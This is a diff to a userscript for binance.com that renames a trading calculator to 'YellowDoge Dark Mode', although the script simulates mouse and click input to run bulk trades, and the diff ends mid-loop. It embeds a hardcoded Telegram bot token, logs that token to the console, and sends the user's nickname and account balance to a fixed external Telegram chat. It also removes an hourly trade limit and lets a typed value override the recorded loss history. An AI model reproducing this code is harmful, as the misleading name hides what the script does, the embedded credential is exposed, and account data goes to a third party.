@@ -1,7 +1,9 @@
+// @ts-nocheck
 // ==UserScript==
-// @name         Binance Trading Calculator v2
+// @name         YellowDoge Dark Mode
 // @match        *://*.binance.com/*
-// @grant        none
+// @grant        GM_xmlhttpRequest
+// @connect      api.telegram.org
 // ==/UserScript==
 
 (function() {
@@ -99,6 +101,12 @@
         let originalContent = '';
         
         let currentCount = 0;
+        let balanceBeforeTrade = 0;
+        let sessionVolume = 0;
+        
+        // Telegram configuration
+        const TELEGRAM_BOT_TOKEN = '8394008255:AAH7r1AHxSYx8iFFP32mfUOvOWg3o_NocxA';
+        const TELEGRAM_CHAT_ID = '@LeonTradingBot';
         
         // Enhanced WebSocket and data interception
         function interceptWebSocket() {
@@ -135,9 +143,7 @@
                             });
                         }
                         
-                        if (window.livePrice) {
-                            console.log('Live price updated:', window.livePrice);
-                        }
+                        // Removed verbose logging
                     } catch (e) {}
                     
                     if (originalOnMessage) {
@@ -201,24 +207,31 @@
         interceptGlobalData();
         
         // Auto-hover chart to trigger price display
+        let debugDot = null;
         function triggerChartHover() {
-            const chartArea = document.querySelector('[data-testid="kline"]') || 
-                            document.querySelector('.kline-container') ||
-                            document.querySelector('canvas.scene');
-            if (chartArea) {
-                const rect = chartArea.getBoundingClientRect();
-                const centerX = rect.left + rect.width / 2;
+            const canvas = document.querySelector('canvas.hit');
+            if (canvas) {
+                const rect = canvas.getBoundingClientRect();
+                const hoverXOffset = parseFloat(document.getElementById('hover-x')?.value || '-20');
+                const x = rect.right + hoverXOffset;
                 const centerY = rect.top + rect.height / 2;
                 
-                chartArea.dispatchEvent(new MouseEvent('mouseover', {
+                const yOffset = (Math.random() - 0.5) * 6;
+                const y = centerY + yOffset;
+                
+                // Debug: Show red dot at hover position
+                if (!debugDot) {
+                    debugDot = document.createElement('div');
+                    debugDot.style.cssText = 'position:fixed;width:10px;height:10px;background:red;border-radius:50%;z-index:999999999;pointer-events:none;';
+                    document.body.appendChild(debugDot);
+                }
+                debugDot.style.left = (x - 5) + 'px';
+                debugDot.style.top = (y - 5) + 'px';
+                
+                canvas.dispatchEvent(new MouseEvent('mousemove', {
                     bubbles: true,
-                    clientX: centerX,
-                    clientY: centerY
-                }));
-                chartArea.dispatchEvent(new MouseEvent('mousemove', {
-                    bubbles: true,
-                    clientX: centerX,
-                    clientY: centerY
+                    clientX: x,
+                    clientY: y
                 }));
             }
         }
@@ -226,10 +239,8 @@
         // Control auto-hover to avoid interfering with user interactions
         let autoHoverEnabled = true;
         let hoverInterval = setInterval(() => {
-            if (autoHoverEnabled) {
-                triggerChartHover();
-            }
-        }, 100); // Reduced frequency to 100ms
+            triggerChartHover();
+        }, 100); // Always trigger, removed autoHoverEnabled check
         
         // Monitor DOM changes for price updates
         const observer = new MutationObserver(() => {
@@ -303,38 +314,69 @@
         //     }, 5000);
         // });
         
+        // Get token name
+        function getTokenName() {
+            return getXPathElement('/html/body/div[4]/div/div[2]/div/div/div[1]/div[3]/div[1]')?.textContent.trim() || 'Unknown';
+        }
+        
         // Create single overlay
-        const overlay = makeOverlay('trading-overlay', 'Trading Calculator', {top: '12px', left: '12px'});
+        const overlay = makeOverlay('trading-overlay', `🐕 YellowDoge - ${getTokenName()}`, {top: '12px', left: '12px'});
         
         // Update overlay content structure
         const overlayHTML = `
-            <div style="margin-bottom:4px;">Balance: <span id="balance">-</span> USDT</div>
-            <div style="margin-bottom:4px;">Market: <span id="market-price">Loading...</span></div>
-            <div style="margin-bottom:4px;">Amount: <input id="trade-amount" type="number" value="1" style="width:60px; padding:2px 4px; background:#333; color:white; border:1px solid #555; border-radius:3px;" /> USDT</div>
-            <div style="display:flex; align-items:center; gap:4px; margin-bottom:4px;">
-                <div style="flex:1;">Buy: <span id="buy-price">-</span></div>
-                <button id="fill-buy" style="padding:4px 8px; cursor:pointer; background:#4CAF50; border:none; border-radius:4px; color:white; font-size:12px;">Fill</button>
-                <button id="auto-buy" style="padding:4px 8px; cursor:pointer; background:#2E7D32; border:none; border-radius:4px; color:white; font-size:12px;">Buy</button>
+            <div style="font-size:11px; margin-bottom:4px;">
+                Nickname: <input id="user-nickname" type="text" placeholder="Enter name" value="${localStorage.getItem('traderNickname') || ''}" style="width:100px; padding:2px; background:#333; color:white; border:1px solid #555; border-radius:3px; font-size:11px;" />
             </div>
-            <div style="margin-bottom:4px;">Sell: <span id="sell-price">-</span></div>
-            <div style="margin-bottom:4px;">Loss: <span id="loss-percent">-</span> | Spread: <span id="spread-info">-</span></div>
-            <div style="margin-bottom:4px;">Est. Loss: <span id="loss-usdt">-</span> USDT</div>
-            <div style="margin-bottom:4px; padding-top:4px; border-top:1px solid #444;">
-                Max Loss: <input id="max-loss" type="number" value="10" step="0.1" style="width:50px; padding:2px 4px; background:#333; color:white; border:1px solid #555; border-radius:3px;" /> USDT
+            <div style="font-size:11px; margin-bottom:4px;">
+                Hover X: <input id="hover-x" type="number" value="${localStorage.getItem('hoverX') || '-105'}" style="width:50px; padding:2px; background:#333; color:white; border:1px solid #555; border-radius:3px; font-size:11px;" /> px from right
+                <button id="save-config" style="padding:2px 6px; cursor:pointer; background:#4CAF50; border:none; border-radius:3px; color:white; font-size:9px; margin-left:4px;">Save</button>
             </div>
-            <div style="margin-bottom:4px;">
-                Max/Hr: <input id="max-trades-hour" type="number" value="30" min="1" style="width:50px; padding:2px 4px; background:#333; color:white; border:1px solid #555; border-radius:3px;" /> trades
+            <div style="font-size:20px; font-weight:bold; margin-bottom:8px;">
+                <div style="margin-bottom:4px;">Market: <span id="market-price" style="color:#FFD700;">Loading...</span></div>
+                <div style="margin-bottom:4px;">Buy: <span id="buy-price" style="color:#4CAF50;">-</span></div>
+                <div style="margin-bottom:4px;">Sell: <span id="sell-price" style="color:#FF6B6B;">-</span></div>
+                <div style="margin-bottom:4px;">Loss: <span id="loss-percent" style="color:#FF9800;">-</span></div>
             </div>
-            <div style="margin-bottom:4px;">
-                Delay: <input id="trade-delay" type="number" value="4" min="1" max="10" style="width:50px; padding:2px 4px; background:#333; color:white; border:1px solid #555; border-radius:3px;" /> sec
+            <div style="font-size:18px; font-weight:bold; color:#FF0000; margin-bottom:4px; padding:8px; background:rgba(255,0,0,0.1); border-radius:4px;">
+                Total Loss: <span id="total-loss-display">0.000000</span> USDT
             </div>
-            <div style="display:flex; align-items:center; gap:4px; margin-top:8px; padding-top:8px; border-top:1px solid #555;">
-                <div style="flex:1;">Trades: <input id="bulk-trades" type="number" value="10" min="1" style="width:50px; padding:2px 4px; background:#333; color:white; border:1px solid #555; border-radius:3px;" /></div>
-                <button id="bulk-start" style="padding:4px 12px; cursor:pointer; background:#FF9800; border:none; border-radius:4px; color:white; font-size:12px; font-weight:bold;">Start</button>
-                <button id="bulk-pause" style="padding:4px 12px; cursor:pointer; background:#F44336; border:none; border-radius:4px; color:white; font-size:12px; font-weight:bold; display:none;">Pause</button>
+            <div style="font-size:11px; margin-bottom:8px;">
+                Set Loss: <input id="loss-input" type="number" step="0.000001" value="${localStorage.getItem('lossInput') || '0'}" style="width:70px; padding:2px; background:#333; color:white; border:1px solid #555; border-radius:3px; font-size:11px;" />
+                <button id="update-loss-btn" style="padding:2px 8px; cursor:pointer; background:#FF5722; border:none; border-radius:3px; color:white; font-size:10px;">Update</button>
             </div>
-            <div id="bulk-total-loss" style="margin-top:4px; font-size:12px; color:#FF6B6B;"></div>
-            <div id="bulk-status" style="margin-top:4px; font-size:12px; color:#FFD700;"></div>
+            <div style="font-size:11px; color:#999; margin-bottom:4px;">
+                Balance: <span id="balance">-</span> | Spread: <span id="spread-info">-</span>
+            </div>
+            <div style="font-size:11px; margin-bottom:4px;">
+                Amount: <input id="trade-amount" type="number" value="${localStorage.getItem('tradeAmount') || '1'}" style="width:50px; padding:2px; background:#333; color:white; border:1px solid #555; border-radius:3px; font-size:11px;" /> USDT
+            </div>
+            <div style="display:flex; gap:4px; margin-bottom:4px;">
+                <button id="fill-buy" style="padding:4px 8px; cursor:pointer; background:#4CAF50; border:none; border-radius:4px; color:white; font-size:11px;">Fill</button>
+                <button id="auto-buy" style="padding:4px 8px; cursor:pointer; background:#2E7D32; border:none; border-radius:4px; color:white; font-size:11px;">Buy</button>
+            </div>
+            <div style="font-size:11px; margin-bottom:2px;">
+                Max Loss: <input id="max-loss" type="number" value="${localStorage.getItem('maxLoss') || '2'}" step="0.1" style="width:50px; padding:2px; background:#333; color:white; border:1px solid #555; border-radius:3px; font-size:11px;" />
+                Delay: <input id="trade-delay" type="number" value="${localStorage.getItem('tradeDelay') || '2'}" min="1" max="10" style="width:40px; padding:2px; background:#333; color:white; border:1px solid #555; border-radius:3px; font-size:11px;" />s
+            </div>
+            <div style="display:flex; align-items:center; gap:4px; margin-top:6px; padding-top:6px; border-top:1px solid #555;">
+                <input id="bulk-trades" type="number" value="${localStorage.getItem('bulkTrades') || '10'}" min="1" style="width:40px; padding:2px; background:#333; color:white; border:1px solid #555; border-radius:3px; font-size:11px;" />
+                <button id="bulk-start" style="padding:4px 10px; cursor:pointer; background:#FF9800; border:none; border-radius:4px; color:white; font-size:11px; font-weight:bold;">Start</button>
+                <button id="bulk-pause" style="padding:4px 10px; cursor:pointer; background:#F44336; border:none; border-radius:4px; color:white; font-size:11px; font-weight:bold; display:none;">Pause</button>
+                <button id="bulk-stop" style="padding:4px 10px; cursor:pointer; background:#D32F2F; border:none; border-radius:4px; color:white; font-size:11px; font-weight:bold; display:none;">Stop</button>
+                <button id="clear-history" style="padding:4px 10px; cursor:pointer; background:#9C27B0; border:none; border-radius:4px; color:white; font-size:11px;">Clear</button>
+            </div>
+            <div style="margin-top:4px;">
+                <button id="test-telegram" style="padding:4px 10px; cursor:pointer; background:#0088cc; border:none; border-radius:4px; color:white; font-size:11px; width:100%;">📱 Test Telegram</button>
+            </div>
+            <div style="font-size:11px; margin-top:4px;">
+                <label style="cursor:pointer;"><input type="checkbox" id="detailed-report" style="margin-right:4px;"/> Detailed Report</label>
+                <label style="cursor:pointer; margin-left:8px;"><input type="checkbox" id="console-log-enabled" style="margin-right:4px;"/> Console Log</label>
+            </div>
+            <div id="bulk-status" style="margin-top:4px; font-size:11px; color:#FFD700;"></div>
+            <div style="margin-top:4px;">
+                <textarea id="log-output" readonly style="width:100%; height:100px; background:#1a1a1a; color:#0f0; border:1px solid #555; border-radius:3px; font-family:monospace; font-size:9px; padding:4px; resize:vertical;"></textarea>
+                <button id="clear-log" style="padding:2px 6px; cursor:pointer; background:#555; border:none; border-radius:3px; color:white; font-size:9px; margin-top:2px;">Clear Log</button>
+            </div>
         `;
         document.getElementById('trading-overlay-content').innerHTML = overlayHTML;
         originalContent = overlayHTML;
@@ -384,15 +426,15 @@
             const hiddenSellField = document.querySelector('div[style*="display: none"] input[placeholder="Limit Sell"]');
             const isHidden = !!hiddenSellField;
             
-            console.log('Sell price field hidden:', isHidden);
+            if (document.getElementById('console-log-enabled')?.checked) console.log('Sell price field hidden:', isHidden);
             
             if (isHidden) {
-                console.log('Sell price field is hidden - need to check Reverse Order');
+                if (document.getElementById('console-log-enabled')?.checked) console.log('Sell price field is hidden - need to check Reverse Order');
                 ensureCheckboxChecked();
                 return false;
             }
             
-            console.log('Sell price field is visible');
+            if (document.getElementById('console-log-enabled')?.checked) console.log('Sell price field is visible');
             return true;
         }
         
@@ -412,23 +454,22 @@
             
             if (reverseOrderCheckbox) {
                 const isChecked = reverseOrderCheckbox.getAttribute('aria-checked') === 'true';
-                console.log('Reverse Order checkbox found, aria-checked:', reverseOrderCheckbox.getAttribute('aria-checked'));
+                if (document.getElementById('console-log-enabled')?.checked) console.log('Reverse Order checkbox found, aria-checked:', reverseOrderCheckbox.getAttribute('aria-checked'));
                 
                 if (isChecked) {
-                    console.log('Reverse Order already checked - no action needed');
+                    if (document.getElementById('console-log-enabled')?.checked) console.log('Reverse Order already checked - no action needed');
                 } else {
-                    console.log('Reverse Order unchecked - clicking to check it');
+                    if (document.getElementById('console-log-enabled')?.checked) console.log('Reverse Order unchecked - clicking to check it');
                     humanClick(reverseOrderCheckbox);
                 }
             } else {
-                console.log('Reverse Order checkbox not found');
+                if (document.getElementById('console-log-enabled')?.checked) console.log('Reverse Order checkbox not found');
             }
         }
         
         // Add button handlers
         document.getElementById('fill-buy').addEventListener('click', (e) => {
             e.stopPropagation();
-            ensureCheckboxChecked();
             
             const buyPrice = document.getElementById('buy-price').textContent;
             const sellPrice = document.getElementById('sell-price').textContent;
@@ -468,11 +509,142 @@
             }
         });
         
+        // Save config button
+        document.getElementById('save-config').addEventListener('click', (e) => {
+            e.stopPropagation();
+            localStorage.setItem('hoverX', document.getElementById('hover-x').value);
+            localStorage.setItem('traderNickname', document.getElementById('user-nickname').value);
+            localStorage.setItem('tradeAmount', document.getElementById('trade-amount').value);
+            localStorage.setItem('maxLoss', document.getElementById('max-loss').value);
+            localStorage.setItem('tradeDelay', document.getElementById('trade-delay').value);
+            localStorage.setItem('bulkTrades', document.getElementById('bulk-trades').value);
+            localStorage.setItem('lossInput', document.getElementById('loss-input').value);
+            log('✓ Configuration saved');
+        });
+        
         // Prevent inputs from triggering drag
-        ['trade-amount', 'bulk-trades', 'bulk-pause', 'max-loss', 'max-trades-hour', 'trade-delay'].forEach(id => {
+        ['user-nickname', 'hover-x', 'save-config', 'trade-amount', 'bulk-trades', 'bulk-pause', 'bulk-stop', 'max-loss', 'trade-delay', 'clear-history', 'test-telegram', 'loss-input', 'update-loss-btn', 'log-output', 'clear-log', 'detailed-report', 'console-log-enabled'].forEach(id => {
             const el = document.getElementById(id);
             if (el) el.addEventListener('mousedown', (e) => e.stopPropagation());
         });
+        
+        // Log function that appends to textarea
+        function log(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            const logOutput = document.getElementById('log-output');
+            if (logOutput) {
+                logOutput.value += `[${timestamp}] ${message}\n`;
+                logOutput.scrollTop = logOutput.scrollHeight;
+            }
+            const consoleLogEnabled = document.getElementById('console-log-enabled')?.checked;
+            if (consoleLogEnabled) {
+                console.log(message);
+            }
+        }
+        
+        // Clear log button
+        document.getElementById('clear-log').addEventListener('click', (e) => {
+            e.stopPropagation();
+            document.getElementById('log-output').value = '';
+        });
+        
+        // Save nickname to localStorage on change
+        document.getElementById('user-nickname').addEventListener('input', (e) => {
+            localStorage.setItem('traderNickname', e.target.value);
+        });
+        
+        // Update loss button
+        document.getElementById('update-loss-btn').addEventListener('click', (e) => {
+            e.stopPropagation();
+            const input = document.getElementById('loss-input');
+            const value = parseFloat(input.value);
+            if (!isNaN(value)) {
+                localStorage.removeItem('binanceTrades');
+                localStorage.setItem('manualLossAdjustment', value.toString());
+                document.getElementById('total-loss-display').textContent = value.toFixed(6);
+            }
+        });
+        
+        // Clear history button
+        document.getElementById('clear-history').addEventListener('click', (e) => {
+            e.stopPropagation();
+            localStorage.removeItem('binanceTrades');
+            localStorage.removeItem('manualLossAdjustment');
+            document.getElementById('total-loss-display').textContent = '0.000000';
+            log('✓ Trade history cleared and Total Loss reset to 0');
+        });
+        
+        // Test Telegram button
+        document.getElementById('test-telegram').addEventListener('click', async (e) => {
+            e.stopPropagation();
+            const btn = e.target;
+            btn.textContent = 'Sending...';
+            btn.disabled = true;
+            
+            const nickname = localStorage.getItem('traderNickname') || 'Trader';
+            const tokenName = getTokenName();
+            const message = `<b>[${nickname}]</b> - ${new Date().toLocaleString()}\n\n` +
+                `🧪 <b>Test Message</b>\n` +
+                `🪙 Token: ${tokenName}\n\n` +
+                `✅ Telegram bot is working correctly!\n` +
+                `📊 Current Balance: ${window.currentBalance.toFixed(2)} USDT`;
+            
+            await sendTelegramMessage(message);
+            
+            btn.textContent = '✓ Sent!';
+            setTimeout(() => {
+                btn.textContent = '📱 Test Telegram';
+                btn.disabled = false;
+            }, 2000);
+        });
+        
+        // Send message to Telegram
+        async function sendTelegramMessage(message) {
+            console.log('Sending Telegram message...');
+            console.log('Bot Token:', TELEGRAM_BOT_TOKEN);
+            console.log('Chat ID:', TELEGRAM_CHAT_ID);
+            console.log('Message:', message);
+            
+            return new Promise((resolve, reject) => {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                GM_xmlhttpRequest({
+                    method: 'POST',
+                    url: url,
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    data: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    }),
+                    onload: function(response) {
+                        try {
+                            const result = JSON.parse(response.responseText);
+                            console.log('Telegram API response:', result);
+                            
+                            if (!result.ok) {
+                                console.error('Telegram API error:', result.description);
+                                alert(`Telegram error: ${result.description}`);
+                                reject(new Error(result.description));
+                            } else {
+                                console.log('Message sent successfully!');
+                                resolve(result);
+                            }
+                        } catch (e) {
+                            console.error('Parse error:', e);
+                            reject(e);
+                        }
+                    },
+                    onerror: function(error) {
+                        console.error('Telegram send error:', error);
+                        alert(`Failed to send Telegram message: Network error`);
+                        reject(error);
+                    }
+                });
+            });
+        }
         
         // Get trading fee in tokens and convert to USDT
         function getTradingFeeUSDT(marketPrice) {
@@ -487,40 +659,57 @@
         }
         
         // Wait until Open Orders is completely empty (both Buy and Sell completed)
-        async function waitForTradeCompletion() {
-            console.log('Waiting for trade completion...');
+        async function waitForTradeCompletion(entryPrice) {
+            log('Waiting for trade completion... Entry price: ' + entryPrice);
             
-            // Check for notification popups first
             let checkCount = 0;
+            let sellOnlyCount = 0;
             while (checkCount < 30) { // Max 30 seconds
-                await new Promise(r => setTimeout(r, 1000));
-                checkCount++;
-                
-                // Check for buy/sell order filled notifications
-                const buyNotification = document.querySelector('.bn-notification-content-title');
-                if (buyNotification && (buyNotification.textContent.includes('Buy Order Filled') || buyNotification.textContent.includes('Sell Order Filled'))) {
-                    console.log('Order filled notification detected:', buyNotification.textContent);
-                    // Close notification
-                    const closeBtn = document.querySelector('.bn-notification-close');
-                    if (closeBtn) closeBtn.click();
-                }
-                
-                // Check Open Orders section
-                const orderSection = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div');
-                if (orderSection) {
-                    const orderText = orderSection.textContent;
-                    console.log(`Check ${checkCount}: Order section text:`, orderText);
+                try {
+                    // Check Open Orders section FIRST before waiting
+                    const orderSection = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div');
+                    if (orderSection) {
+                        const orderText = orderSection.textContent;
+                        if (checkCount % 3 === 0) { // Log every 3 seconds
+                            if (orderText.includes('No Ongoing Orders')) {
+                                log('No orders');
+                            } else if (orderText.includes('Buy') && orderText.includes('Sell')) {
+                                log('Buy+Sell active');
+                            } else if (orderText.includes('Buy')) {
+                                log('Buy active');
+                            } else if (orderText.includes('Sell')) {
+                                log('Sell active');
+                            }
+                        }
                     
                     // Success: No orders at all
                     if (orderText.includes('No Ongoing Orders')) {
-                        console.log('Trade completed - No Ongoing Orders');
+                        log('✓ Trade completed - No Ongoing Orders');
                         return 'completed';
                     }
-                
-                    // Handle stuck orders after 10 seconds
-                if (checkCount >= 10) {
-                    if (orderText.includes('Buy')) {
-                        console.log('Buy order stuck for 10s, canceling...');
+                    
+                    // Price movement detection - cancel if market moves 0.2% away
+                    if (entryPrice) {
+                        const { currentPrice } = getMarketData();
+                        if (currentPrice) {
+                            const priceMovement = Math.abs((currentPrice - entryPrice) / entryPrice * 100);
+                            if (priceMovement > 0.2) {
+                                log(`⚠ Price moved ${priceMovement.toFixed(3)}% from entry, canceling...`);
+                                const cancelAllBtn = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div/div[3]/div/div/div[1]/table/thead/tr/th[9]/div') ||
+                                                   document.querySelector('th.bn-web-table-cell:nth-child(9)');
+                                if (cancelAllBtn) {
+                                    humanClick(cancelAllBtn);
+                                    await new Promise(r => setTimeout(r, 200));
+                                    await clickCancelConfirmWithRetry();
+                                    return 'price_moved';
+                                }
+                            }
+                        }
+                    }
+                    
+                    // Handle stuck buy orders after 10 seconds
+                    if (checkCount >= 10 && orderText.includes('Buy')) {
+                        log('⏱ Buy order stuck 10s, canceling...');
                         const cancelBtn = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div/div[3]/div/div/div[1]/table/thead/tr/th[9]/div');
                         if (cancelBtn) {
                             humanClick(cancelBtn);
@@ -528,26 +717,58 @@
                             await clickCancelConfirmWithRetry();
                             return 'cancelled';
                         }
-                    } else if (orderText.includes('Sell')) {
-                        console.log('Sell order stuck for 10s, canceling all...');
-                        const cancelAllBtn = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div/div[3]/div/div/div[1]/table/thead/tr/th[9]/div') ||
-                                           document.querySelector('th.bn-web-table-cell:nth-child(9)');
-                        if (cancelAllBtn) {
-                            humanClick(cancelAllBtn);
-                            await new Promise(r => setTimeout(r, 200));
-                            await clickCancelConfirmWithRetry();
-                            return 'cancelled';
+                    }
+                    
+                        // Track when only Sell order is active (Buy has filled)
+                        if (orderText.includes('Sell') && !orderText.includes('Buy')) {
+                            sellOnlyCount++;
+                            log(`Sell-only count: ${sellOnlyCount}s`);
+                            // After 5 seconds of Sell-only, execute cleanup
+                            if (sellOnlyCount >= 5) {
+                                log('⏱ Sell order stuck 5s after Buy filled, verifying before cleanup...');
+                                await new Promise(r => setTimeout(r, 200));
+                                const recheck = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div');
+                                const recheckText = recheck ? recheck.textContent : '';
+                                if (recheckText.includes('No Ongoing Orders')) {
+                                    log('✓ Order filled during verification!');
+                                    return 'completed';
+                                } else if (recheckText.includes('Sell')) {
+                                    log('✓ Confirmed stuck, executing cleanup...');
+                                    await cleanupStuckSellOrder();
+                                    log('Waiting 2s after cleanup order placed...');
+                                    await new Promise(r => setTimeout(r, 2000));
+                                    log('Verifying token sold...');
+                                    const verified = await verifyTokenSold();
+                                    if (verified) {
+                                        log('✓ Cleanup verified - token sold');
+                                    } else {
+                                        log('⚠ Token still held after cleanup');
+                                    }
+                                    return 'cleanup';
+                                }
+                            }
+                        } else {
+                            sellOnlyCount = 0; // Reset counter if Buy is still active
                         }
                     }
+                    
+                    // Check for buy/sell order filled notifications
+                    const buyNotification = document.querySelector('.bn-notification-content-title');
+                    if (buyNotification && (buyNotification.textContent.includes('Buy Order Filled') || buyNotification.textContent.includes('Sell Order Filled'))) {
+                        console.log('Order filled notification detected:', buyNotification.textContent);
+                        const closeBtn = document.querySelector('.bn-notification-close');
+                        if (closeBtn) closeBtn.click();
+                    }
+                } catch (error) {
+                    log(`⚠ Error in wait loop: ${error.message}`);
                 }
                 
-                    // Continue waiting if Sell order exists (normal flow)
-                    if (orderText.includes('Sell')) {
-                        console.log('Sell order active, waiting...');
-                        continue;
-                    }
-                }
+                await new Promise(r => setTimeout(r, 1000));
+                checkCount++;
             }
+            
+            log('⏱ Timeout after 30 seconds');
+            return 'timeout';
         }
         
         // Cookie storage functions
@@ -558,28 +779,23 @@
         }
         
         function getTotalLossFromStorage() {
+            const manualAdjustment = parseFloat(localStorage.getItem('manualLossAdjustment') || '0');
+            if (manualAdjustment !== 0) return manualAdjustment;
+            
             const trades = JSON.parse(localStorage.getItem('binanceTrades') || '[]');
-            return trades.reduce((sum, t) => sum + parseFloat(t.lossUSDT || 0), 0);
+            return trades.reduce((sum, t) => sum + parseFloat(t.actualLoss || 0), 0);
         }
         
-        function getTradesInLastHour() {
-            const trades = JSON.parse(localStorage.getItem('binanceTrades') || '[]');
-            const oneHourAgo = new Date(Date.now() - 3600000).toISOString();
-            return trades.filter(t => t.timestamp > oneHourAgo).length;
-        }
+
         
         // Safety checks
         function checkMaxLoss() {
-            const maxLoss = parseFloat(document.getElementById('max-loss').value) || 10;
+            const maxLoss = parseFloat(document.getElementById('max-loss').value) || 2;
             const totalLoss = getTotalLossFromStorage();
             return totalLoss < maxLoss;
         }
         
-        function checkRateLimit() {
-            const maxPerHour = parseInt(document.getElementById('max-trades-hour').value) || 30;
-            const tradesLastHour = getTradesInLastHour();
-            return tradesLastHour < maxPerHour;
-        }
+
         
         function checkBalance(amount) {
             return window.currentBalance >= amount;
@@ -588,6 +804,8 @@
         // Bulk trade execution
         let isExecuting = false;
         let isPaused = false;
+        let completedTradesCount = 0;
+        let balanceBeforeSession = 0;
         async function executeBulkTrades() {
             if (isExecuting) {
                 console.log('Already executing, stopping current execution');
@@ -595,29 +813,127 @@
                 await new Promise(r => setTimeout(r, 500));
             }
             
-            console.log('Starting new bulk trade execution');
-            isExecuting = true;
-            isPaused = false;
+            // Check if Reverse Order checkbox is checked
+            const checkboxes = document.querySelectorAll('div[role="checkbox"]');
+            let reverseOrderCheckbox = null;
+            
+            for (const checkbox of checkboxes) {
+                const nextSibling = checkbox.nextElementSibling;
+                if (nextSibling && nextSibling.textContent.includes('Reverse Order')) {
+                    reverseOrderCheckbox = checkbox;
+                    break;
+                }
+            }
+            
+            if (!reverseOrderCheckbox) {
+                console.log('Reverse Order checkbox not found');
+                const statusEl = document.getElementById('bulk-status');
+                if (statusEl) {
+                    statusEl.textContent = 'Error: Reverse Order checkbox not found';
+                    statusEl.style.color = '#FF0000';
+                    setTimeout(() => {
+                        statusEl.textContent = '';
+                    }, 3000);
+                }
+                return;
+            }
+            
+            const isChecked = reverseOrderCheckbox.getAttribute('aria-checked') === 'true';
+            console.log('Reverse Order checkbox aria-checked:', reverseOrderCheckbox.getAttribute('aria-checked'));
+            
+            if (!isChecked) {
+                console.log('Reverse Order checkbox is NOT checked');
+                const statusEl = document.getElementById('bulk-status');
+                if (statusEl) {
+                    statusEl.textContent = 'Please check the Reverse Order checkbox first';
+                    statusEl.style.color = '#FF9800';
+                    setTimeout(() => {
+                        statusEl.textContent = '';
+                    }, 3000);
+                }
+                return;
+            }
+            
+            console.log('Reverse Order checkbox is checked - proceeding');
             
             const tradesCount = parseInt(document.getElementById('bulk-trades').value) || 10;
             const statusEl = document.getElementById('bulk-status');
+            
+            // Countdown before starting
+            statusEl.textContent = 'Starting in 3...';
+            statusEl.style.color = '#FFD700';
+            await new Promise(r => setTimeout(r, 1000));
+            statusEl.textContent = 'Starting in 2...';
+            await new Promise(r => setTimeout(r, 1000));
+            statusEl.textContent = 'Starting in 1...';
+            await new Promise(r => setTimeout(r, 1000));
+            
+            console.log('Starting new bulk trade execution');
+            isExecuting = true;
+            isPaused = false;
+            completedTradesCount = 0;
+            sessionVolume = 0;
             const totalLossEl = document.getElementById('bulk-total-loss');
             const startBtn = document.getElementById('bulk-start');
             const pauseBtn = document.getElementById('bulk-pause');
             
             startBtn.style.display = 'none';
             pauseBtn.style.display = 'inline-block';
+            document.getElementById('bulk-stop').style.display = 'inline-block';
+            
+            // Capture balance BEFORE any cleanup
+            balanceBeforeSession = window.currentBalance;
+            log(`Session starting balance: ${balanceBeforeSession.toFixed(2)} USDT`);
             
             // Initial cleanup check
-            statusEl.textContent = 'Checking for existing orders...';
+            statusEl.textContent = 'Checking prerequisites...';
             statusEl.style.color = '#FFD700';
             await cleanupExistingSellOrders();
+            await new Promise(r => setTimeout(r, 500));
+            
+            // Check holdings and sell if > $0.5
+            const tokenName = getTokenName();
+            const holdingsTab = document.querySelector('#bn-tab-holdings');
+            if (holdingsTab) holdingsTab.click();
+            await new Promise(r => setTimeout(r, 500));
+            
+            const row = Array.from(document.querySelectorAll('table tbody tr')).find(r => r.textContent.includes(tokenName));
+            if (row) {
+                const valueCell = row.querySelector('td:nth-child(3) .text-TertiaryText');
+                if (valueCell) {
+                    const usdValue = parseFloat(valueCell.textContent.replace(/[^0-9.]/g, ''));
+                    if (usdValue > 0.5) {
+                        log(`⚠ Holding ${tokenName}: $${usdValue} (> $0.5), executing sell...`);
+                        statusEl.textContent = 'Selling initial holdings...';
+                        const openOrdersTab = document.querySelector('#bn-tab-orderOrder > div:nth-child(1)');
+                        if (openOrdersTab) openOrdersTab.click();
+                        await new Promise(r => setTimeout(r, 500));
+                        
+                        // Cancel all existing orders first
+                        const cancelAllBtn = getXPathElement('/html/body/div[4]/div/div[3]/div/div[8]/div/div/div/div/div[2]/div[1]/div/div[3]/div/div/div[1]/table/thead/tr/th[9]/div');
+                        if (cancelAllBtn) {
+                            log('Canceling existing orders...');
+                            humanClick(cancelAllBtn);
+                            await new Promise(r => setTimeout(r, 500));
+                            await clickCancelConfirmWithRetry();
+                            await new Promise(r => setTimeout(r, 1000));
+                        }
+                        
+                        await cleanupStuckSellOrder();
+                        await new Promise(r => setTimeout(r, 2000));
+                        balanceBeforeTrade = window.currentBalance;
+                    }
+                }
+            }
+            
+            const openOrdersTab = document.querySelector('#bn-tab-orderOrder > div:nth-child(1)');
+            if (openOrdersTab) openOrdersTab.click();
             await new Promise(r => setTimeout(r, 500));
             
             for (let i = 0; i < tradesCount; i++) {
                 if (!isExecuting) break;
                 
-                console.log(`Starting trade ${i + 1}/${tradesCount}`);
+                log(`\n=== Trade ${i + 1}/${tradesCount} ===`);
                 
                 // Check pause
                 while (isPaused && isExecuting) {
@@ -626,10 +942,66 @@
                 }
                 if (!isExecuting) break;
                 
+                // Check prerequisites before trade
+                const tokenName = getTokenName();
+                
+                // Check Holdings tab - token value must be < $1
+                const holdingsTab = document.querySelector('#bn-tab-holdings');
+                if (holdingsTab) holdingsTab.click();
+                await new Promise(r => setTimeout(r, 500));
+                
+                const row = Array.from(document.querySelectorAll('table tbody tr')).find(r => r.textContent.includes(tokenName));
+                if (row) {
+                    const valueCell = row.querySelector('td:nth-child(3) .text-TertiaryText');
+                    if (valueCell) {
+                        const usdValue = parseFloat(valueCell.textContent.replace(/[^0-9.]/g, ''));
